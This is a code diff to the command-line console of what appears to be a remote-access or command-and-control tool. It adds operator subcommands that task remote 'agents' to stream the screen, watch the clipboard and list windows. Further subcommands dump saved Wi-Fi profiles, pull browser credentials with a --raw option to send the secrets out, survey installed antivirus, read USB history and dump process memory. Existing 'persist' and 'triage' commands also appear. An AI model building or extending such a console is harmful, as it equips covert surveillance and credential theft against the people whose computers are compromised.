@@ -2956,6 +2956,61 @@ def build_parser() -> argparse.ArgumentParser:
     clip.add_argument("--wait", action="store_true")
     clip.add_argument("--timeout", type=float, default=120.0)
 
+    # -- the senses of the desktop ----------------------------------------
+    # The eight families that only a workstation can answer.  The console
+    # asks for them with the names of the protocol, and the operator reads
+    # the truth of the machine.
+    win = sub.add_parser("windows", help="list the windows of an agent")
+    win.add_argument("agent")
+    win.add_argument("--wait", action="store_true")
+    win.add_argument("--timeout", type=float, default=120.0)
+
+    clipw = sub.add_parser("clipboard-watch",
+                            help="the watcher of the clipboard of an agent")
+    clipw.add_argument("agent")
+    clipw.add_argument("--action", default="status",
+                       choices=["start", "stop", "poll", "status"])
+    clipw.add_argument("--wait", action="store_true")
+    clipw.add_argument("--timeout", type=float, default=120.0)
+
+    stream = sub.add_parser("screen-stream",
+                             help="the screen of an agent, frame by frame")
+    stream.add_argument("agent")
+    stream.add_argument("--frames", type=int, default=5)
+    stream.add_argument("--fps", type=int, default=1)
+    stream.add_argument("--wait", action="store_true")
+    stream.add_argument("--timeout", type=float, default=120.0)
+
+    wifi = sub.add_parser("wifi-profiles",
+                          help="the saved networks of an agent")
+    wifi.add_argument("agent")
+    wifi.add_argument("--wait", action="store_true")
+    wifi.add_argument("--timeout", type=float, default=120.0)
+
+    brc = sub.add_parser("browser-creds",
+                         help="the material of the browsers of an agent")
+    brc.add_argument("agent")
+    brc.add_argument("--raw", action="store_true",
+                     help="put the secrets of the records on the wire")
+    brc.add_argument("--wait", action="store_true")
+    brc.add_argument("--timeout", type=float, default=120.0)
+
+    av = sub.add_parser("av-survey", help="the security software of an agent")
+    av.add_argument("agent")
+    av.add_argument("--wait", action="store_true")
+    av.add_argument("--timeout", type=float, default=120.0)
+
+    usb = sub.add_parser("usb-history", help="the USB keys of an agent")
+    usb.add_argument("agent")
+    usb.add_argument("--wait", action="store_true")
+    usb.add_argument("--timeout", type=float, default=120.0)
+
+    mem = sub.add_parser("memory", help="the memory of a process of an agent")
+    mem.add_argument("agent")
+    mem.add_argument("pid")
+    mem.add_argument("--wait", action="store_true")
+    mem.add_argument("--timeout", type=float, default=120.0)
+
     # -- file triage and search -------------------------------------------
     triage = sub.add_parser("triage", help="triage a file on an agent")
     triage.add_argument("agent")
@@ -3997,6 +4052,34 @@ def main(argv: Optional[List[str]] = None) -> int:
                 print(f"{target} ({len(png)} bytes)")
         elif args.cmd == "clipboard":
             run_task_and_wait(client, console, args.agent, "clipboard", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "windows":
+            run_task_and_wait(client, console, args.agent, "window.list", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "clipboard-watch":
+            run_task_and_wait(client, console, args.agent, "clipboard.watch",
+                              {"action": args.action},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "screen-stream":
+            run_task_and_wait(client, console, args.agent, "screen.stream",
+                              {"frames": args.frames, "fps": args.fps},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "wifi-profiles":
+            run_task_and_wait(client, console, args.agent, "wifi.profiles", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "browser-creds":
+            run_task_and_wait(client, console, args.agent, "browser.creds",
+                              {"raw": bool(args.raw)},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "av-survey":
+            run_task_and_wait(client, console, args.agent, "av.survey", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "usb-history":
+            run_task_and_wait(client, console, args.agent, "usb.history", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "memory":
+            run_task_and_wait(client, console, args.agent, "proc.memory",
+                              {"pid": str(args.pid)},
                               args.wait, args.timeout, args.json)
         elif args.cmd == "persist":
             run_task_and_wait(client, console, args.agent, "persist",
